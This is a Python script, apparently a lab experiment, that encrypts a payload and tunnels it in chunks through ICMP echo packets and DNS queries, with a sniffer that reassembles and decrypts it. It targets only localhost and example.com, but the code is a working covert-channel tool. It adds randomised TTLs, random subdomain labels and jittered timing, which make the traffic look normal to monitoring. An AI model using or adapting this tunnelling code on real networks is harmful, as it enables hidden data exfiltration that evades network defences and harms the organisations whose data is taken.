import os
import random
import string
import time
import hashlib
import threading
import zlib
from scapy.all import IP, ICMP, UDP, DNS, DNSQR, send, sniff, conf
from scapy.packet import Raw
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Configuration
SECRET_KEY = "mysecretkey12345"  # Key for encryption and decryption
received_chunks = {}  # Dictionary to hold received chunks
all_chunks_received = threading.Event()  # Event to signal all chunks are received
stop_sniffer = threading.Event()  # Event to signal the sniffer to stop
dict_lock = threading.Lock()  # Lock for thread-safe access to received_chunks
DNS_DOMAIN = "example.com"  # Example domain for DNS queries
dns_servers = ["127.0.0.1"]  # DNS server IP for testing

# Encryption and Compression function
def encrypt_and_compress_payload(payload):
    # Compress the payload
    compressed_payload = zlib.compress(payload.encode())
    # Encrypt the compressed payload
    key = hashlib.sha256(SECRET_KEY.encode()).digest()  # Derive a 256-bit key from the secret key
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(compressed_payload, AES.block_size))
    return cipher.iv + ct_bytes

# Decryption and Decompression function
def decrypt_and_decompress_payload(encrypted_payload):
    try:
        key = hashlib.sha256(SECRET_KEY.encode()).digest()  # Derive a 256-bit key from the secret key
        iv = encrypted_payload[:16]
        ct = encrypted_payload[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        compressed_payload = unpad(cipher.decrypt(ct), AES.block_size)
        # Decompress the payload
        decompressed_payload = zlib.decompress(compressed_payload)
        return decompressed_payload.decode()
    except ValueError as e:
        raise ValueError(f"Decryption failed due to incorrect data format: {e}")
    except Exception as e:
        raise Exception(f"Decryption failed: {e}")

# ICMP Payload Sender
def send_icmp_payload(payload, target_ip):
    chunk_size = 32
    payload_chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]
    for i, chunk in enumerate(payload_chunks):
        sequence_number = i  # Use a consistent sequence number for ordering
        ttl_value = random.randint(30, 128)  # Random TTL value between common ranges
        packet = IP(dst=target_ip, ttl=ttl_value) / ICMP(type=8, seq=sequence_number) / Raw(load=chunk)
        send(packet, verbose=False)
        print(f"[Sender - ICMP] Sent packet with sequence number {sequence_number}, TTL {ttl_value}, and chunk: {chunk}")

# DNS Payload Sender
def send_dns_payload(payload, domain):
    chunk_size = 32
    payload_chunks = [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]

    for i, chunk in enumerate(payload_chunks):
        random_label = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
        query_domain = f"{random_label}-{i}.{domain}"
        packet = IP(dst=random.choice(dns_servers)) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_domain)) / Raw(load=chunk)
        print(f"[Sender - DNS] Sending DNS query: {query_domain} with chunk: {chunk}")
        send(packet, verbose=False)
        time.sleep(random.uniform(0.05, 0.2))  # Reduced delay to make transmission faster and more natural

# Packet Sniffer and Reassembler
def packet_sniffer():
    def icmp_sniffer(packet):
        if stop_sniffer.is_set():
            return

        if packet.haslayer(ICMP) and packet.haslayer(Raw):  # Capture all ICMP packets with data
            try:
                payload_data = packet[Raw].load
                seq_num = packet[ICMP].seq

                # Only process packets with valid sequence numbers
                if seq_num is None:
                    print("[Sniffer - ICMP] Ignored packet with no sequence number.")
                    return

                print(f"[Sniffer - ICMP] ICMP packet received with sequence number {seq_num}")

                with dict_lock:
                    if seq_num not in received_chunks:
                        received_chunks[seq_num] = payload_data
                        print(f"[Sniffer - ICMP] ICMP chunk received: {payload_data}")
                        print(f"[Sniffer - ICMP] Current received chunks: {received_chunks}")

            except Exception as e:
                print(f"[Sniffer - ICMP] Error decoding ICMP packet: {e}")

    def dns_sniffer(packet):
        if stop_sniffer.is_set():
            return

        if packet.haslayer(DNS) and packet.haslayer(Raw):  # Capture all DNS packets with data
            try:
                payload_data = packet[Raw].load
                query_name = packet[DNS].qd.qname.decode().strip('.')

                # Only process packets with the target domain
                if DNS_DOMAIN in query_name:
                    print(f"[Sniffer - DNS] DNS packet received for query: {query_name}")
                    index = int(query_name.split('-')[1].split('.')[0])

                    with dict_lock:
                        if index not in received_chunks:
                            received_chunks[index] = payload_data
                            print(f"[Sniffer - DNS] DNS chunk received: {payload_data}")
                            print(f"[Sniffer - DNS] Current received chunks: {received_chunks}")

            except Exception as e:
                print(f"[Sniffer - DNS] Error decoding DNS packet: {e}")

    # Start sniffing ICMP and DNS packets
    sniff(filter="icmp or udp port 53", prn=lambda pkt: icmp_sniffer(pkt) or dns_sniffer(pkt), store=0, iface="Software Loopback Interface 1", stop_filter=lambda x: stop_sniffer.is_set())

# Run Payload Transmission
if __name__ == "__main__":
    target_ip = "127.0.0.1"
    text_payload = "This is my hardcoded payload that I am tunneling over."

    # Encrypt and compress the payload before transmission
    encrypted_payload = encrypt_and_compress_payload(text_payload)

    # Start the sniffer thread
    print("[Main] Starting sniffer thread...")
    sniffer_thread = threading.Thread(target=packet_sniffer, daemon=True)
    sniffer_thread.start()

    # Give the sniffer more time to initialize
    time.sleep(2)  # Reduced wait time for sniffer initialization
    print("[Main] Sniffer thread started. Sending payload...")

    # Send the payload via ICMP
    send_icmp_payload(encrypted_payload, target_ip)
    # Send the payload via DNS
    send_dns_payload(encrypted_payload, DNS_DOMAIN)

    print("[Main] Payload transmission complete.")

    # Signal the sniffer to stop
    stop_sniffer.set()

    # Attempt to reassemble and decrypt the payload after sending is complete
    with dict_lock:
        if received_chunks:
            try:
                reassembled_payload = b''.join([received_chunks[key] for key in sorted(received_chunks.keys()) if key is not None])
                # Decrypt and decompress the payload
                decrypted_payload = decrypt_and_decompress_payload(reassembled_payload)
                print(f"[Receiver] Final Reassembled and Decrypted Payload: {decrypted_payload}")
            except ValueError as ve:
                print(f"[Receiver] Error due to incorrect data format: {ve}")
            except Exception as e:
                print(f"[Receiver] Error reassembling or decrypting payload: {e}")
        else:
            print("[Receiver] No packets were received.")

    # Wait for the sniffer thread to finish
    sniffer_thread.join(timeout=5)  # Reduced wait time for sniffer thread to complete

    print("[Main] Sniffer thread has been stopped. Exiting program.")
